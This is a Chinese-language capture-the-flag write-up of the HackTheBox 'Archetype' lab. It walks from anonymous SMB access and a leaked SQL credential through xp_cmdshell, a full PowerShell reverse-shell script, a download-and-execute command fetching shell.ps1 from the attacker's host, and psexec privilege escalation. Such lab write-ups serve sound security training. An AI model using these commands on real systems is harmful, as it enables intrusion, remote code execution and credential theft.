# 原创
：  HackTheBox-Archetype

# HackTheBox-Archetype

#### HackTheBox-Archetype

## 连接配置

> 
参考之前写的连接配置，[文章链接](https://blog.csdn.net/LYJ20010728/article/details/119116747?spm=1001.2014.3001.5502)


## 信息收集

> 
根据网站提示，目标是`10.10.10.27`，使用nmap进行扫描


```
nmap -sS -A 10.10.10.27

```

> 
发现目标开启了135、139、445、1433端口，其中1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口


## 测试445端口

> 
测试445端口的SMB服务是否支持匿名访问，没有经过权限配置可能默认允许所有人无需身份认证来匿名访问共享资源，使用smbclient来访问samba服务器的共享资源


```
smbclient -N -L //10.10.10.27/

-N：匿名登录
-L：获取共享资源列表

```

> 
在共享资源列表内发现存在一个backups目录，使用smbclient访问它观察一下


```
smbclient -N //10.10.10.27/backups

```

> 
使用`dir`命令列出backups文件夹下的文件，发现存在一个prod.dtsConfig文件，它是与SSIS一起使用的配置文件，使用`get`命令下载到主机上，使用`cat`命令查看一下文件内容


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6fd615495305457d9e535b95ff0a88a3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/63790e6351714d0d92ba52c53f3ca168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
发现其中包含本地Windows用户的凭据的`Password`和`User ID`参数，User ID参数的值为ARCHETYPE\sql_svc，ARCHETYPE是靶机的主机名，sql_svc是具有数据库登录权限的操作系统用户名


```
&lt;DTSConfiguration&gt;
    &lt;DTSConfigurationHeading&gt;
        &lt;DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/&gt;
    &lt;/DTSConfigurationHeading&gt;
    &lt;Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String"&gt;
        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;
    &lt;/Configuration&gt;
&lt;/DTSConfiguration&gt;

```

### smbclient命令的使用方法 (补充)

```
1，列出某个IP地址所提供的共享文件夹
smbclient -L 198.168.0.1 -U username%password

2,像FTP客户端一样使用smbclient
smbclient //192.168.0.1/tmp -U username%password
执行 smbclient命令成功后，进入 smbclient环境，出现提示符： smb:/&gt; 这时输入？会看到支持的命令
这里有许多命令和ftp命令相似，如cd 、lcd、get、megt、put、mput等。通过这些命令，我们可以访问远程主机的共享资源。

3,直接一次性使用smbclient命令
smbclient -c "ls" //192.168.0.1/tmp -U username%password
和
smbclient //192.168.0.1/tmp -U username%password
smb:/&gt;ls
功能一样的

例，创建一个共享文件夹
smbclient -c "mkdir share1" //192.168.0.1/tmp -U username%password
如果用户共享//192.168.0.1/tmp的方式是只读的，会提示
NT_STATUS_ACCESS_DENIED making remote directory /share1

4，除了使用smbclient，还可以通过mount和smbcount挂载远程共享文件夹
挂载 mount -t cifs -o username=administrator,password=123456 //192.168.0.1/tmp /mnt/tmp
取消挂载 umount /mnt/tmp

```

## 连接数据库

> 
在python2环境下利用`impacket`连接数据库


> 
判断当前是否拥有sysadmin权限


```
SELECT IS_SRVROLEMEMBER('sysadmin')

```

> 
返回值为1，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行


## 使用数据库调用系统命令

> 
利用数据库调用执行系统命令


```
EXEC sp_configure 'Show Advanced Options', 1;			\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项
reconfigure;											\\确认上面的操作
sp_configure;											\\查看当前sp_configure配置情况
EXEC sp_configure 'xp_cmdshell', 1;						\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令
reconfigure;											\\确认上面的操作
xp_cmdshell "whoami" 									\\在靶机上调用cmdshell执行whoami

```

> 
SQL返回当前数据库进程的操作系统用户为`archetype\sql_svc`


## 获取操作系统普通用户权限

> 



```
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.53",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

> 
用python起一个http服务器，监听80端口来供靶机下载shell.ps1文件


```
python3 -m http.server 80

```

> 
在kali中启动netcat监听443端口，等待靶机反向shell连接 (注意端口号需要与shell.ps1中相对应)


```
nc -nvvlp 443

```

> 
回到数据库shell中，执行命令


```
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.53/shell.ps1\");"

```

> 
目的是为了让靶机到kali内下载shell.ps1文件并执行，查看刚才python搭建的http服务器，发现已经接收到请求


> 
查看监听，发现已经弹回shell，执行一个ipconfig发现可以正常使用


> 
在`C:\Users\sql_svc\Desktop\user.txt`中找到User Own的Flag


## 提权

> 
发现sql_svc是操作系统普通用户、数据库以及数据库服务用户，检查一下频繁访问的文件或已执行的命令，使用如下命令来访问PowerShell历史记录文件


```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

```

> 
发现administrator用户登录后将共享文件夹\Archetype\backups映射到T盘，使用Impacket中的psexec.py来提权


```
psexec.py administrator@10.10.10.27

```

> 
执行 `type C:\Users\Administrator\Desktop\root.txt` 命令成功拿到System Own的Flag

